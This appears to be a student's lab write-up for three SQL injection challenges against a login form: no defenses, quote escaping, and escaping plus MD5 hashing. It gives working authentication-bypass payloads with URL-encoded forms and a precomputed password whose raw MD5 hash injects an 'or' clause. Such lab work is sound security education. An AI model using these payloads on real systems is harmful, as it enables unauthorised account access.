# SQL Injection

## No Defenses
### Solution
username : victim 

Password : x' or 'c'='c 

From URL page: username=victim&password=x%27%20or%20%27c%27%3D%27c

Why it worked: Since the effective sql query only returns true,
as the latter part of the query 'c'='c' is true when or-ed with
the rest of the query the sum total is always true.


## Simple escaping
The server escapes single quotes in the inputs by replacing them with two single quotes.

### Solution
username : victim 

Password : \'' or 5=5;-- 

From URL page : username=victim&password=%5C%27%27%20or%205%3D5%3B--%20

Why it worked: In this query we use backslash inorder to make the quotes a part of the string.
Also the next quote when read due to already having a quote before it does not get replaced by
2 single quotes. Thus the query effectively becomes true as 5=5 is true and is or-ed with the 
rest of the query.

# Escaping and hashing
The server uses the given PHP code (server.php), which escapes the username and applies the MD5
hash function to the password. (Hint: In MySQL when two binary values are compared,
such as ”\xd5S' = '\xb2” , the result is True.)

### Solution

From URL Page : username=victim&password=129581926211651571912466741651878684928

How the code works: **sqli.py**
The code uses brute force in order to find strings that when hashed have an occurance of:
1. 'or' 2.'OR' 3. '||' in it followed by a number. This will make the SQL query always true.

Execution Time:
It takes almost 2-3 hour to process the output, since 5 places are checked for.
